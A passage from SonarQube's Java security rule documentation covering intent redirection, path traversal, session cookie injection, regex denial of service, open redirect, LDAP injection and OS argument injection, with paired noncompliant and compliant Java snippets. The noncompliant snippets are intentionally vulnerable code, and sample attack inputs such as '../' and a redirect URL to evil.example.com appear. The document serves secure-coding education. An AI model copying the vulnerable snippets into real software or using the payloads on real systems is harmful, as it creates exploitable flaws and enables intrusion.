<p>Therefore, by crafting a malicious intent and submitting it to the vulnerable redirecting component, an attacker can retrieve most data exposed by
private features. This affects the confidentiality of information that is not protected by an additional security mechanism, such as an encryption
algorithm.</p>
<h4>Attack surface increase</h4>
<p>Because the attacker can access most components of the application, they can identify and exploit other vulnerabilities that would be present in
them. The actual impact depends on the nested vulnerability. Exploitation probability depends on the in-depth security level of the application.</p>
<h4>Privilege escalation</h4>
<p>If the vulnerable application has privileges on the underlying devices, an attacker exploiting the redirection issue might take advantage of them.
For example by crafting a malicious intent action, the attacker could be able to pass phone calls on behalf of the entitled application.</p>
<p>This can lead to various attack scenarios depending on the exploited permissions.</p>
<h4>Persistent code execution</h4>
<p>A lot of applications rely on dynamic code loading to implement a variety of features, such as:</p>
<ul><li> Minor feature updates. </li><li> Application package size reduction. </li><li> DRM or other code protection features. </li></ul>
<p>When a component exposes a dynamic code loading feature, an attacker could use it during the redirection’s exploitation to deploy malicious code
into the application. The component can be located in the application itself or one of its dependencies.</p>
<p>Such an attack would compromise the application execution environment entirely and lead to multiple security threats. The malicious code could:</p>
<ul><li> Intercept and exfiltrate all data used in the application. </li><li> Steal authentication credentials to third-party services. </li><li> Change the application’s behavior to serve another malicious purpose (phishing, ransoming, etc) </li></ul>
<p>Note that in most cases, the deployed malware can persist application or hosting device restarts.</p>
<h2>How to fix it in Android</h2>
<h3>Code examples</h3>
<p>This code is vulnerable to intent injection attacks because it starts a new activity from a user-provided intent without prior validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class Noncompliant extends AppCompatActivity {
    &#64;Override
    protected void onCreate(Bundle savedInstanceState) {
        Intent intent &#61; getIntent();
        Intent forward &#61; (Intent) intent.getParcelableExtra(&#34;anotherintent&#34;);
        startActivity(forward); // Noncompliant
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class MainActivity extends AppCompatActivity {
    &#64;Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent &#61; getIntent();
        Intent forward &#61; (Intent) intent.getParcelableExtra(&#34;anotherintent&#34;);

        ComponentName name &#61; forward.resolveActivity(getPackageManager());
        if (name.getPackageName().equals(&#34;safePackage&#34;) &amp;&amp;
                name.getClassName().equals(&#34;safeClass&#34;)) {
            startActivity(forward);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>In general, security best practices discourage forwarding intents. However, when the application requires such a feature, it should precisely check
the forwarded intents to ensure they do not pass malicious content.</p>
<p>Additionally, the components that are not meant to be accessed externally should be marked as non-exported in the application’s manifest. This is
done by setting the <code>android:exported</code> attribute of the components to <code>&#34;false&#34;</code>.</p>
<h4>Checking the intent destination</h4>
<p>Most unintended usage of the forwarding feature can be prevented by verifying whether the destination package and class names belong to a list of
accepted components.</p>
<p>The allow-list of accepted destinations should only contain components that perform non-sensitive actions and handle non-sensitive data. Moreover,
it should not allow reaching components that further redirect inner intents.</p>
<p>The example compliant code uses the <code>resolveActivity</code> method of the inner intent to determine its target component. It then uses the
<code>getPackageName</code> and <code>getClassName</code> methods to validate this destination is not sensitive.</p>
<h4>Checking the intent origin</h4>
<p>Before forwarding the intent, the application can check its origin. Verifying the origin package is trusted prevents the forwarding feature from
being used by an external component.</p>
<p>The <code>getCallingActivity</code> method of the forwarded intent can be used to determine the origin component.</p>
<h4>Permissions downgrade</h4>
<p>Before forwarding an intent to another component, the application can verify or remove the permissions set on the forwarded intent. In that case,
even if the destination is a sensitive component, the application can ensure the untrusted intent will not be able to read or write sensitive data or
locations.</p>
<p>In most cases, the application should drop the following permissions from untrusted intents:</p>
<ul><li> FLAG_GRANT_READ_URI_PERMISSION </li><li> FLAG_GRANT_WRITE_URI_PERMISSION </li></ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul><li> <a href="https://support.google.com/faqs/answer/9267555?hl&#61;en" rel="nofollow">support.google.com</a> - Remediation for Intent Redirection Vulnerability <a href="https://developer.android.com/topic/security/risks/intent-redirection" rel="nofollow">developer.android.com</a> - Intent redirection </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Platform Interaction Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage" rel="nofollow">OWASP Mobile Top 10 2016 Category M1</a> - Improper
  Platform Usage </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2083">
              javasecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to delete arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
&#64;Controller
public class ExampleController
{
    static private String targetDirectory &#61; &#34;/path/to/target/directory/&#34;;

    &#64;GetMapping(value &#61; &#34;/delete&#34;)
    public void delete(&#64;RequestParam(&#34;filename&#34;) String filename) throws IOException {

        File file &#61; new File(targetDirectory &#43; filename);
        file.delete();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
&#64;Controller
public class ExampleController
{
    static private String targetDirectory &#61; &#34;/path/to/target/directory/&#34;;

    &#64;GetMapping(value &#61; &#34;/delete&#34;)
    public void delete(&#64;RequestParam(&#34;filename&#34;) String filename) throws IOException {

        File file &#61; new File(targetDirectory &#43; filename);
        String canonicalDestinationPath &#61; file.getCanonicalPath();

        if (!canonicalDestinationPath.startsWith(targetDirectory)) {
            throw new IOException(&#34;Entry is outside of the target directory&#34;);
        }

        file.delete();
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol><li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li><li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalPath</code>. This will resolve relative path or
  path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li><li> Check that the canonical path is within the directory where the file should be located. </li></ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol><li> <code>data &#61; transform(user_input);</code> </li><li> <code>data &#61; normalize(data);</code> </li><li> <code>data &#61; sanitize(data);</code> </li><li> <code>use(data);</code> </li></ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v&#61;V-DdcKADnFk" rel="nofollow">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br /> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
static private String targetDirectory &#61; &#34;/Users/John&#34;;

&#64;GetMapping(value &#61; &#34;/endpoint&#34;)
public void endpoint(&#64;RequestParam(&#34;folder&#34;) fileName) throws IOException {

    String canonicalizedFileName &#61; fileName.getCanonicalPath();

    if (!canonicalizedFileName .startsWith(targetDirectory)) {
        throw new IOException(&#34;Entry is outside of the target directory&#34;);
    }
}
</pre>
<p>This check can be bypassed because <code>&#34;/Users/Johnny&#34;.startsWith(&#34;/Users/John&#34;)</code> returns <code>true</code>. Thus, for validation,
<code>&#34;/Users/John&#34;</code> should actually be <code>&#34;/Users/John/&#34;</code>.</p>
<p><strong>Warning</strong>: Some functions, such as <code>.getCanonicalPath</code>, remove the terminating path separator in their return value.<br />
The validation code should be tested to ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3" rel="nofollow">Here is a real-life example of this vulnerability.</a></p>
<h4>Do not use java.nio.file.Path.resolve as a validator</h4>
<p>As specified in the <a href="https://docs.oracle.com/javase/8/docs/api/java/nio/file/Path.html" rel="nofollow">official documentation</a>, if the given parameter
is an absolute path, the base object from which the method is called is discarded and is not included in the resulting string.</p>
<p>This means that including untrusted data in the parameter and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/22" rel="nofollow">MITRE, CWE-22</a> - Improper Limitation of a Pathname to a Restricted Directory (&#39;Path
  Traversal&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6287">
              javasecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a href="https://example.com?cookie&#61;injectedcookie" rel="nofollow">https://example.com?cookie&#61;injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br /> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    Optional&lt;Cookie&gt; cookieOpt &#61; Arrays.stream(request.getCookies())
                                    .filter(c -&gt; c.getName().equals(&#34;jsessionid&#34;))
                                    .findFirst();

    if (!cookieOpt.isPresent()) {
        String cookie &#61; request.getParameter(&#34;cookie&#34;);
        Cookie cookieObj &#61; new Cookie(&#34;jsessionid&#34;, cookie);
        response.addCookie(cookieObj);
    }

    response.sendRedirect(&#34;/welcome.jsp&#34;);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    Optional&lt;Cookie&gt; cookieOpt &#61; Arrays.stream(request.getCookies())
                                    .filter(c -&gt; c.getName().equals(&#34;jsessionid&#34;))
                                    .findFirst();

    if (!cookieOpt.isPresent()) {
        response.sendRedirect(&#34;/getCookie.jsp&#34;);
    } else {
        response.sendRedirect(&#34;/welcome.jsp&#34;);
    }
}
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br /> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/384" rel="nofollow">MITRE, CWE-384</a> - Session Fixation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2631">
              javasecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br /> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service because untrusted data is used as a regex to scan a string without prior
sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public boolean validate(HttpServletRequest request) {
  String regex &#61; request.getParameter(&#34;regex&#34;);
  String input &#61; request.getParameter(&#34;input&#34;);

  return input.matches(regex);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public boolean validate(HttpServletRequest request) {
  String regex &#61; request.getParameter(&#34;regex&#34;);
  String input &#61; request.getParameter(&#34;input&#34;);

  return input.matches(Pattern.quote(regex));
}
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br /> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br />
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2" rel="nofollow">re2</a>.</p>
<p>In the example, <code>Pattern.quote</code> escapes metacharacters and escape sequences that could have broken the initially intended logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul><li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" rel="nofollow">OWASP Regular expression Denial of Service - ReDoS</a>
  </li></ul>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/400" rel="nofollow">MITRE, CWE-400</a> - Uncontrolled Resource Consumption </li><li> <a href="https://cwe.mitre.org/data/definitions/1333" rel="nofollow">MITRE, CWE-1333</a> - Inefficient Regular Expression Complexity </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5146">
              javasecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url&#61;evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br /></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br /></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br /> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String location &#61; req.getParameter(&#34;url&#34;);
  resp.sendRedirect(location);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String location &#61; req.getParameter(&#34;url&#34;);

  List&lt;String&gt; allowedHosts &#61; new ArrayList&lt;String&gt;();
  allowedHosts.add(&#34;https://trusted1.example.com/&#34;);
  allowedHosts.add(&#34;https://trusted2.example.com/&#34;);

  if (allowedHosts.contains(location))
    resp.sendRedirect(location);
}
</pre>
<h3>How does this work?</h3>
<p>Built-in framework methods should be preferred as, more often than not, these provide additional security mechanisms. Usually, these built-in
methods are engineered for internal page redirections. Thus, they might not be the solution for the reader’s use case.</p>
<p>In case the application strictly requires external redirections based on user-controllable data, this could be done using the following
alternatives:</p>
<ol><li> Validating the <code>authority</code> part of the URL against a statically defined value (see Pitfalls). </li><li> Using an allow-list approach in case the destination URLs are multiple but limited. </li><li> Adding a customized page to which users are redirected, warning about the imminent action and requiring manual authorization to proceed. </li></ol>
<h3>Pitfalls</h3>
<h4>The trap of &#39;StartsWith&#39; and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br /></p>
<p>If the validation string does not contain a terminating path separator, the Open Redirect vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith(&#34;https://example.com&#34;)</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.com.malicious.io</code>. The practice of taking over domains that maliciously look like
existing domains is widespread and is called <a href="https://en.wikipedia.org/wiki/Cybersquatting" rel="nofollow">Cybersquatting</a>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/601" rel="nofollow">MITRE, CWE-601</a> - URL Redirection to Untrusted Site (&#39;Open Redirect&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2078">
              javasecurity:S2078
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it
first.</p>
<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br /> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must
be treated the same way as basic LDAP injections.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable
field to execute malicious LDAP commands.</p>
<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Data leakage or corruption</h4>
<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data
leakage or corruption.</p>
<h4>Privilege escalation</h4>
<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform
authorization checks or authentication.</p>
<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to LDAP injections because untrusted data is concatenated to an LDAP query without prior sanitization
or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public boolean authenticate(HttpServletRequest req, DirContext ctx) throws NamingException {
  String user &#61; req.getParameter(&#34;user&#34;);
  String pass &#61; req.getParameter(&#34;pass&#34;);

  String filter &#61; &#34;(&amp;(uid&#61;&#34; &#43; user &#43; &#34;)(userPassword&#61;&#34; &#43; pass &#43; &#34;))&#34;;

  NamingEnumeration&lt;SearchResult&gt; results &#61; ctx.search(&#34;ou&#61;system&#34;, filter, new SearchControls());
  return results.hasMore();
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public boolean authenticate(HttpServletRequest req, DirContext ctx) throws NamingException {
  String user &#61; req.getParameter(&#34;user&#34;);
  String pass &#61; req.getParameter(&#34;pass&#34;);

  String filter &#61; &#34;(&amp;(uid&#61;{0})(userPassword&#61;{1}))&#34;;

  NamingEnumeration&lt;SearchResult&gt; results &#61; ctx.search(&#34;ou&#61;system&#34;, filter, new String[]{user, pass}, new SearchControls());
  return results.hasMore();
}
</pre>
<h3>How does this work?</h3>
<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the
initially intended logic.</p>
<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>
<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>
<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the
application to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>
<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>
<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>
<ul><li> <code>\</code> </li><li> <code>#</code> </li><li> <code>&#43;</code> </li><li> <code>&lt;</code> </li><li> <code>&gt;</code> </li><li> <code>,</code> </li><li> <code>;</code> </li><li> <code>&#34;</code> </li><li> <code>&#61;</code> </li></ul>
<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>
<ul><li> <code>*</code> </li><li> <code>(</code> </li><li> <code>)</code> </li><li> <code>\</code> </li><li> <code>null</code> </li></ul>
<p>For Java, OWASP’s functions <a href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForDN-java.lang.String-" rel="nofollow"><code>encodeForDN</code></a>
and <a href="https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForLDAP-java.lang.String-" rel="nofollow"><code>encodeForLDAP</code></a>
allow sanitizing these characters and should be used: Remember that it is never a good practice to reinvent the wheel and write your own encoders.<br />
However, if it is not possible to use these libraries, <a href="https://github.com/bcgit/bc-java/blob/r1rv74/prov/src/main/java/org/bouncycastle/jce/provider/X509LDAPCertStoreSpi.java#L52-L70" rel="nofollow">here</a> is an
example of an encoder implementation for LDAP search filters, in the <code>Bouncy Castle Java</code> framework.</p>
<p>In the compliant solution example, the <code>search</code> function allows to safely parameterize the query.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://www.owasp.org/index.php/Top_10-2017_A1-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://www.ietf.org/rfc/rfc4514.txt" rel="nofollow">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li><li> <a href="https://www.ietf.org/rfc/rfc4515.txt" rel="nofollow">RFC 4515</a> - LDAP: String Representation of Search Filters </li><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li><li> <a href="https://cwe.mitre.org/data/definitions/90" rel="nofollow">MITRE, CWE-90</a> - Improper Neutralization of Special Elements used in an LDAP Query
  (&#39;LDAP Injection&#39;) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5883">
              javasecurity:S5883
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>OS command argument injections occur when applications allow the execution of operating system commands from untrusted data but the untrusted data
is limited to the arguments.<br /> It is not possible to directly inject arbitrary commands that compromise the underlying operating system, but the
behavior of the executed command still might be influenced in a way that allows to expand access, for example, execution of arbitrary commands. The
security of the application depends on the behavior of the application that is executed.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting an arguments injection vulnerability will be able to add arbitrary argument to a system binary call. Depending on the
command the parameters are added to, this might lead to arbitrary command execution.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process runs with root privileges,
and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul><li> download the internal server’s data, most likely to sell it </li><li> modify data, send malware </li><li> stop services or exhaust resources (with fork bombs for example) </li></ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of OS injections and <strong>misconfiguration</strong> of:</p>
